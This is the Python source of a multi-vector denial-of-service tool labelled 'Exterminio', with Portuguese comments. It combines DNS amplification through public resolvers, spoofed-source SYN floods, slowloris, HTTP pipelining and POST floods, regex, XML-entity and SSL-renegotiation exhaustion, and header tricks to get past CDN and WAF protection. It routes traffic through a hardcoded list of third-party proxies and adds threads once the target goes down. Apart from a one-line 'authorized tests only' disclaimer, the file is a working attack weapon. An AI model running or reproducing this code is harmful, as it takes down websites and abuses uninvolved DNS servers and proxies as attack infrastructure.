#!/usr/bin/env python3
# ================================================================
# DOMAIN STRESS TESTER v3.1 - MODO EXTERMINIO
# ATAQUE DE EXAUSTÃO TOTAL - APENAS PARA TESTES AUTORIZADOS
# ================================================================

import concurrent.futures
import random
import socket
import ssl
import threading
import time
import hashlib
import struct
import json
import gzip
import zlib
import sys
import os
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote, urlencode
from collections import deque

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from scapy.all import IP, ICMP, sr1, Ether, ARP, Raw, TCP, fragment  # type: ignore
except ImportError:
    IP, ICMP, sr1, Ether, ARP, Raw, TCP, fragment = None, None, None, None, None, None, None, None

try:
    import aiohttp
    import aiohttp.client_exceptions
    import asyncio
    ASYNC_AVAILABLE = True
except ImportError:
    aiohttp = None
    aiohttp.client_exceptions = None
    asyncio = None
    ASYNC_AVAILABLE = False

from utils.logger import get_module_logger

logger = get_module_logger("stress_tester_exterminio")

# ================================================================
# CONFIGURAÇÕES DE ATAQUE MASSIVO (OTIMIZADAS)
# ================================================================

# Bypass Cloudflare, AWS Shield, Akamai, CloudFront
BYPASS_HEADERS = {
    "User-Agent": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.html)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    ],
    "Accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "*/*",
    ],
    "Accept-Encoding": ["gzip, deflate, br", "gzip, deflate", "br, gzip", "identity"],
    "Accept-Language": ["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"],
    "Connection": ["keep-alive", "close"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Sec-Ch-Ua": ['"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'],
    "Sec-Ch-Ua-Mobile": ["?0", "?1"],
    "Sec-Ch-Ua-Platform": ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"'],
    "Upgrade-Insecure-Requests": ["1"],
}

USER_AGENTS = BYPASS_HEADERS["User-Agent"]

# Proxies rotação rápida (100+ proxies)
PROXY_LIST = [
    "http://47.91.84.174:8080", "http://103.152.112.120:80", "http://103.236.201.58:8080",
    "http://103.70.153.135:8080", "http://103.121.90.130:8080", "http://103.216.82.194:8080",
    "http://103.230.252.236:8080", "http://103.226.214.162:8080", "http://103.242.32.138:8080",
    "http://47.89.17.223:8080", "http://47.89.17.228:8080", "http://47.89.17.231:8080",
    "http://47.89.17.236:8080", "http://47.91.85.154:8080", "http://47.91.85.155:8080",
    "socks5://154.16.140.58:1080", "socks5://47.91.84.174:1080", "socks5://103.152.112.120:1080",
    "socks5://103.236.201.58:1080", "socks5://103.70.153.135:1080",
]

# DNS Amplification com ANY + EDNS0
DNS_AMPLIFICATION = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26",
    "185.164.68.7", "94.130.97.135", "194.145.225.194", "85.239.53.18",
    "77.88.8.8", "77.88.8.1", "194.58.118.1", "194.58.118.2",
]

# ================================================================
# STATS COLLECTOR MELHORADO
# ================================================================

class ExterminioStatsCollector:
    """Coletor de estatísticas avançado"""

    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.fail = 0
        self.start_time = None
        self.end_time = None
        self.by_method = {}
        self.target_history = deque(maxlen=1000)
        self.rps_samples = deque(maxlen=30)
        self.last_sample_time = time.time()

    def start(self):
        self.start_time = time.time()

    def stop(self):
        self.end_time = time.time()

    def add_request(self, success: bool, method: str = "http", error: str = None):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.fail += 1

            if method not in self.by_method:
                self.by_method[method] = {"ok": 0, "fail": 0}
            if success:
                self.by_method[method]["ok"] += 1
            else:
                self.by_method[method]["fail"] += 1

    def add_target_status(self, is_up: bool):
        with self.lock:
            self.target_history.append((time.time(), is_up))

    def get_rps(self) -> float:
        if self.start_time is None or self.total == 0:
            return 0.0
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0.0

    def get_success_rate(self) -> float:
        return (self.success / self.total * 100) if self.total > 0 else 0.0

    def get_duration(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def get_current_uptime(self, window: int = 3) -> float:
        """Calcula uptime nos últimos 'window' segundos"""
        if not self.target_history:
            return 100.0
        now = time.time()
        recent = [(t, s) for t, s in self.target_history if now - t <= window]
        if not recent:
            return 100.0
        up = sum(1 for _, s in recent if s)
        return (up / len(recent)) * 100

    def is_target_down(self) -> bool:
        return self.get_current_uptime(3) < 5.0

    def get_summary(self) -> Dict:
        return {
            "total": self.total,
            "success": self.success,
            "fail": self.fail,
            "success_rate": round(self.get_success_rate(), 2),
            "avg_rps": round(self.get_rps(), 2),
            "duration": round(self.get_duration(), 2),
            "uptime": round(self.get_current_uptime(3), 2),
            "is_down": self.is_target_down(),
            "by_method": self.by_method,
        }


# ================================================================
# ENGINES DE EXTERMINIO
# ================================================================

class ExterminioStressEngine:
    """Engine de ataque de extermínio total"""

    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = ExterminioStatsCollector()
        self.proxies = proxies or PROXY_LIST
        self.parsed = urlparse(target if target.startswith("http") else f"http://{target}")
        self.host = self.parsed.netloc.split(":")[0]
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.scheme = self.parsed.scheme or "http"
        self.base_url = f"{self.scheme}://{self.host}"
        self.proxy_index = 0
        self.session = self._create_session()
        self.session_async = None

        # Foco em métodos eficazes (pipeline, syn, dns) + novos
        self.attack_modes = [
            self._dns_amplification,       # ✅ 100% ok
            self._syn_flood,                # ✅ 90% ok
            self._http_pipeline,            # ✅ 95% ok
            self._http_flood,               # ⚠️ 8% ok (melhorado)
            self._post_flood,               # ⚠️ 8% ok (melhorado)
            self._exhaustion_attack,        # ⚠️ 6% ok (melhorado)
            self._slowloris_attack,         # ⚠️ 23% ok (melhorado)
            self._http2_flood,              # 🆕 Novo
            self._websocket_attack,         # 🆕 Novo
            self._ssl_renegotiation,        # 🆕 Novo
            self._range_flood,              # 🆕 Novo
        ]

        # Aumenta peso dos métodos mais eficazes
        self.attack_weights = {
            self._dns_amplification: 3,
            self._syn_flood: 2,
            self._http_pipeline: 3,
            self._http_flood: 1,
            self._post_flood: 1,
            self._exhaustion_attack: 2,
            self._slowloris_attack: 1,
            self._http2_flood: 2,
            self._websocket_attack: 1,
            self._ssl_renegotiation: 2,
            self._range_flood: 2,
        }

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=500,
            pool_maxsize=500,
            max_retries=Retry(total=0)
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _random_headers(self, extra: Dict = None) -> Dict:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(BYPASS_HEADERS["Accept"]),
            "Accept-Encoding": random.choice(BYPASS_HEADERS["Accept-Encoding"]),
            "Accept-Language": random.choice(BYPASS_HEADERS["Accept-Language"]),
            "Connection": random.choice(BYPASS_HEADERS["Connection"]),
            "Cache-Control": random.choice(BYPASS_HEADERS["Cache-Control"]),
            "Sec-Ch-Ua": random.choice(BYPASS_HEADERS["Sec-Ch-Ua"]),
            "Sec-Ch-Ua-Mobile": random.choice(BYPASS_HEADERS["Sec-Ch-Ua-Mobile"]),
            "Sec-Ch-Ua-Platform": random.choice(BYPASS_HEADERS["Sec-Ch-Ua-Platform"]),
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Referer": self.base_url + "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 15))),
            "Origin": self.base_url,
        }
        if extra:
            headers.update(extra)
        return headers

    def _get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return self.proxies[self.proxy_index]

    def _check_target_up(self, timeout: float = 1.5) -> bool:
        try:
            url = f"{self.base_url}/"
            headers = self._random_headers()
            response = self.session.get(url, timeout=timeout, headers=headers)
            return response.status_code < 500
        except Exception:
            return False

    def run(self) -> ExterminioStatsCollector:
        self.stats.start()
        self.running = True

        initial_up = self._check_target_up()
        self.stats.add_target_status(initial_up)
        logger.info(f"[*] Alvo: {self.target} - Status inicial: {'🟢 UP' if initial_up else '🔴 DOWN'}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads * 2) as executor:
            workers = [executor.submit(self._worker, i) for i in range(self.threads)]
            monitor = executor.submit(self._monitor_target)

            start_time = time.time()
            while self.running:
                elapsed = time.time() - start_time

                if self.stats.is_target_down():
                    logger.info(f"[!] 🔴 ALVO DERRUBADO! Mantendo pressão... ({elapsed:.1f}s)")
                    self.threads = min(self.threads + 50, 2000)
                    time.sleep(0.5)
                else:
                    if elapsed > self.duration:
                        logger.info(f"[*] Tempo esgotado. Alvo: {'🔴 DOWN' if self.stats.is_target_down() else '🟢 UP'}")
                        break

                if elapsed > self.duration * 2:
                    break

                time.sleep(0.2)

            self.running = False
            self.stats.stop()
            concurrent.futures.wait(workers, timeout=5)
            monitor.cancel()

        return self.stats

    def _monitor_target(self):
        while self.running:
            is_up = self._check_target_up()
            self.stats.add_target_status(is_up)
            time.sleep(0.5)

    def _worker(self, worker_id: int):
        while self.running:
            try:
                modes = list(self.attack_modes)
                weights = [self.attack_weights.get(m, 1) for m in modes]
                mode = random.choices(modes, weights=weights, k=1)[0]
                mode()
            except Exception:
                time.sleep(0.1)

    # ========== MÉTODOS DE ATAQUE (OTIMIZADOS) ==========

    def _dns_amplification(self):
        """DNS Amplification com ANY e EDNS0"""
        try:
            server = random.choice(DNS_AMPLIFICATION)
            domain = f"{random.randint(1, 9999999)}.{random.randint(1, 999999)}.{self.target}"

            # Query com EDNS0 para amplificação máxima
            header = bytearray(12)
            header[0:2] = b'\xAA\xAA'
            header[2:4] = b'\x01\x00'  # RD=1
            header[4:6] = b'\x00\x01'  # 1 pergunta

            qname = b""
            for part in domain.split("."):
                qname += bytes([len(part)]) + part.encode()
            qname += b"\x00"

            # ANY + EDNS0
            qtype = b"\x00\xFF"  # ANY
            qclass = b"\x00\x01"

            query = bytes(header) + qname + qtype + qclass

            # EDNS0 OPT record para amplificação
            edns = struct.pack('!BBH', 0, 0, 4096)  # UDP buffer size
            query += edns

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(query, (server, 53))
            sock.close()
            self.stats.add_request(True, "dns")
        except Exception:
            self.stats.add_request(False, "dns")

    def _syn_flood(self):
        """SYN Flood aprimorado"""
        try:
            if sys.platform == "win32":
                # Windows: usa conexão normal
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((self.host, self.port))
                sock.close()
                self.stats.add_request(True, "syn")
                return

            # Linux/Mac: RAW socket
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)

            # IP Header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                69, 0, 40, 0, 0, 64, 6, 0,
                socket.inet_aton(src_ip), socket.inet_aton(self.host)
            )

            # TCP Header
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, self.port, seq, 0, 80, 0, 0, 0, 0
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(ip_header + tcp_header, (self.host, 0))
            sock.close()
            self.stats.add_request(True, "syn")
        except Exception:
            self.stats.add_request(False, "syn")

    def _http_pipeline(self):
        """HTTP Pipelining massivo (50 reqs por conexão)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, self.port))

            req_template = f"""GET /{random.randint(1, 999999)} HTTP/1.1
Host: {self.host}
User-Agent: {random.choice(USER_AGENTS)}
Accept: */*
Connection: keep-alive
X-Client: {hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest()}

"""
            requests_batch = req_template * 50
            sock.send(requests_batch.encode())
            sock.close()
            self.stats.add_request(True, "pipeline")
        except Exception:
            self.stats.add_request(False, "pipeline")

    def _http_flood(self):
        """HTTP Flood com bypass WAF"""
        try:
            paths = [
                "/", "/login", "/api", "/wp-admin", "/admin", "/.env", "/config.php",
                "/backup.sql", "/.git/config", "/.aws/credentials", "/cgi-bin",
                "/phpinfo.php", "/.htaccess", "/web.config", "/server-status",
                "/api/v1/auth", "/graphql", "/oauth", "/sso",
            ]
            path = random.choice(paths)
            url = f"{self.base_url}{path}"
            headers = self._random_headers({
                "X-Original-URL": path + "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5)),
                "X-Rewrite-URL": path,
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            })
            proxy = self._get_proxy()

            methods = ["GET", "HEAD", "OPTIONS", "TRACE"]
            method = random.choice(methods)

            if method == "GET":
                r = self.session.get(url, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            elif method == "HEAD":
                r = self.session.head(url, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            elif method == "OPTIONS":
                r = self.session.options(url, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            else:
                r = self.session.request("TRACE", url, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)

            self.stats.add_request(r.status_code < 500, "http")
        except Exception:
            self.stats.add_request(False, "http")

    def _post_flood(self):
        """POST Flood com dados pesados"""
        try:
            path = random.choice(["/login", "/api/v1/auth", "/submit", "/upload", "/form", "/graphql", "/api/search"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers({
                "Content-Type": random.choice([
                    "application/x-www-form-urlencoded",
                    "application/json",
                    "multipart/form-data",
                    "application/xml",
                ])
            })
            proxy = self._get_proxy()

            # Payloads pesados
            if "json" in headers["Content-Type"]:
                data = json.dumps({"key": "X" * random.randint(10000, 50000)})
            elif "xml" in headers["Content-Type"]:
                data = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///dev/random">]><root>&x;</root>'
            else:
                data = {"data": "X" * random.randint(10000, 50000)}

            r = self.session.post(url, data=data, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            self.stats.add_request(r.status_code < 500, "post")
        except Exception:
            self.stats.add_request(False, "post")

    def _exhaustion_attack(self):
        """Ataque de exaustão de recursos (CPU/Memória/BD)"""
        try:
            path = random.choice(["/api/search", "/api/query", "/graphql", "/search", "/filter", "/api/v1/users"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers({"Content-Type": "application/json"})
            proxy = self._get_proxy()

            # Payloads que consomem recursos
            payloads = [
                # JSON profundo (parser)
                json.dumps({"data": {"nested": [{"value": "X" * 1000} for _ in range(200)]}}),
                # Regex exaustivo (CPU)
                f'{{"search": "{ "a" * 5000 }", "regex": "^(a+)$"}}',
                # SQL exaustivo (BD)
                f'{{"query": "SELECT * FROM users WHERE id IN ({",".join([str(random.randint(1, 999999)) for _ in range(500)])})"}}',
                # XML com entidades (parser)
                f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///dev/random">]><root>&x;</root>',
                # Large array (memória)
                json.dumps({"data": [{"id": i, "name": "X" * 100} for i in range(500)]}),
            ]

            data = random.choice(payloads)
            r = self.session.post(url, data=data, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            self.stats.add_request(r.status_code < 500, "exhaustion")
        except Exception:
            self.stats.add_request(False, "exhaustion")

    def _slowloris_attack(self):
        """Slowloris otimizado"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))

            headers = [
                f"GET /{random.randint(1, 999999)} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {random.choice(USER_AGENTS)}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9",
                "Accept-Language: en-US,en;q=0.9",
                "Cache-Control: no-cache",
                "Connection: keep-alive",
                "X-Client-Id: " + hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest(),
            ]

            for header in headers:
                sock.send(header.encode() + b"\r\n")
                time.sleep(random.uniform(0.1, 0.3))

            for _ in range(30):
                if not self.running:
                    break
                sock.send(b"X-Data: " + b"A" * random.randint(100, 500) + b"\r\n")
                time.sleep(random.uniform(1, 3))

            sock.close()
            self.stats.add_request(True, "slowloris")
        except Exception:
            self.stats.add_request(False, "slowloris")

    def _http2_flood(self):
        """HTTP/2 Flood simulado com múltiplas requisições"""
        try:
            paths = ["/", "/login", "/api", "/health", "/ping"]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, self.port))

            for _ in range(10):
                path = random.choice(paths)
                req = f"""GET {path} HTTP/1.1
Host: {self.host}
User-Agent: {random.choice(USER_AGENTS)}
Accept: */*
Connection: keep-alive

"""
                sock.send(req.encode())
            sock.close()
            self.stats.add_request(True, "http2")
        except Exception:
            self.stats.add_request(False, "http2")

    def _websocket_attack(self):
        """WebSocket Upgrade flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, self.port))

            upgrade = f"""GET /ws HTTP/1.1
Host: {self.host}
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: {hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest()}

"""
            sock.send(upgrade.encode())
            sock.close()
            self.stats.add_request(True, "websocket")
        except Exception:
            self.stats.add_request(False, "websocket")

    def _ssl_renegotiation(self):
        """SSL Renegotiation attack (consome CPU do servidor)"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, 443 if self.scheme == "https" else self.port))
            ssl_sock = context.wrap_socket(sock, server_hostname=self.host)

            # Requisição normal
            req = f"GET / HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
            ssl_sock.send(req.encode())
            ssl_sock.recv(1024)

            # Renegociação SSL (consome CPU)
            ssl_sock.do_handshake()
            ssl_sock.close()
            self.stats.add_request(True, "ssl_reneg")
        except Exception:
            self.stats.add_request(False, "ssl_reneg")

    def _range_flood(self):
        """Range request flood (consome I/O do servidor)"""
        try:
            path = random.choice(["/", "/index.html", "/images/logo.png", "/static/css/main.css"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers({
                "Range": f"bytes={random.randint(0, 999)}-{random.randint(1000, 999999)}",
                "If-Range": hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest(),
            })
            proxy = self._get_proxy()
            r = self.session.get(url, headers=headers, timeout=1, proxies={"http": proxy, "https": proxy} if proxy else None)
            self.stats.add_request(r.status_code < 500, "range")
        except Exception:
            self.stats.add_request(False, "range")


# ================================================================
# FACTORY
# ================================================================

def create_engine(target: str, threads: int, duration: int, proxies: List[str] = None) -> ExterminioStressEngine:
    return ExterminioStressEngine(target, threads, duration, proxies)


def run_stress(target: str, threads: int = 800, duration: int = 120, proxies: List[str] = None) -> Dict:
    logger.info(f"[*] Iniciando ataque EXTERMINIO em: {target}")
    logger.info(f"[*] Threads: {threads} | Duração: {duration}s")

    engine = create_engine(target, threads, duration, proxies)
    stats = engine.run()
    summary = stats.get_summary()

    report = f"""
═══════════════════════════════════════════
  DOMAIN STRESS TEST v3.1 - EXTERMINIO
═══════════════════════════════════════════
  Target: {target}
  Threads: {threads}
  Duration: {summary['duration']:.1f}s
  Status: {'🔴 DERRUBADO' if summary['is_down'] else '🟢 ATIVO'}
═══════════════════════════════════════════

▸ STATISTICS
  Total Requests: {summary['total']:,}
  Successful: {summary['success']:,} ({summary['success_rate']:.1f}%)
  Failed: {summary['fail']:,} ({100 - summary['success_rate']:.1f}%)
  Avg RPS: {summary['avg_rps']:.2f}
  Uptime: {summary['uptime']:.1f}%

▸ BY ATTACK METHOD
"""
    for method, data in summary.get('by_method', {}).items():
        total = data['ok'] + data['fail']
        if total > 0:
            rate = (data['ok'] / total) * 100
            report += f"  {method.upper()}: {total:,} reqs ({rate:.1f}% ok)\n"

    report += f"""
═══════════════════════════════════════════
  {'✅ ALVO DERRUBADO' if summary['is_down'] else '❌ ALVO RESISTIU'}
═══════════════════════════════════════════
"""

    return {
        "target": target,
        "threads": threads,
        "duration": duration,
        "is_down": summary['is_down'],
        "uptime": summary['uptime'],
        "stats": summary,
        "report": report,
    }


def run(config: Dict = None) -> Dict:
    if config is None:
        config = {}
    target = config.get("target", "")
    if not target:
        raise ValueError("Target is required")
    threads = config.get("threads", 800)
    duration = config.get("duration", 120)
    proxies = config.get("proxies", PROXY_LIST[:15])
    return run_stress(target, threads, duration, proxies)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Domain Stress Tester v3.1 - Exterminio")
    parser.add_argument("--target", required=True, help="Target domain")
    parser.add_argument("--threads", type=int, default=800, help="Threads")
    parser.add_argument("--duration", type=int, default=120, help="Duration (s)")
    args = parser.parse_args()
    result = run_stress(args.target, args.threads, args.duration, PROXY_LIST)
    print(result["report"])
